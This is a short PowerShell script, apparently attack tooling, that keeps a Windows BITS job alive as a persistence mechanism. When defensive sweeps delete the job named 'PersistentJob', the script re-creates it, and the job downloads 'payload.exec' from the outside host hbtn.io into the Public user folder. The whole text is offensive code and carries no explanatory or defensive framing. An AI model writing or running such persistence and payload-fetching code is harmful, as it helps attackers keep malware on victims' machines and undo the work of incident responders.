# Monitoring script to ensure BITS persistence survival
$JobName = "PersistentJob"
$BitsJob = Get-BitsTransfer -Name $JobName -ErrorAction SilentlyContinue

if (-not $BitsJob) {
# Re-create job if deleted by defensive sweeps
Start-BitsTransfer -Source "http://hbtn.io/payload.exec" -Destination "C:\Users\Public\payload.exec" -Asynchronous -DisplayName $JobName
}
